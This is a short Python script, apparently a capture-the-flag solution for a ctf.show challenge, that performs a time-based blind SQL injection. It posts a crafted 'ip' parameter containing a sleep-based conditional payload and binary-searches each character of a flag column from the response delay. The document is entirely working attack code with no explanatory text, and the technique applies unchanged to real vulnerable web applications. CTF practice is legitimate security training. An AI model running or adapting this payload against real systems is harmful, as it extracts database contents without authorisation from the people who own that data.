import time
import requests
url = 'http://017862d1-440d-44e3-86de-45412b68b8cd.challenge.ctf.show/api/index.php'
flag = ''
for i in range(60):
    lenth = len(flag)
    min,max = 32,128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            break

        payload = {"ip":f"' or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),{i},1))<{j},sleep(0.5),1)#"
                   ,'debug':0}

        start_time = time.time()
        r = requests.post(url=url,data=payload).text
        end_time = time.time()
        sub = end_time - start_time
        if(sub >= 0.5):
            max = j
        else:
            min = j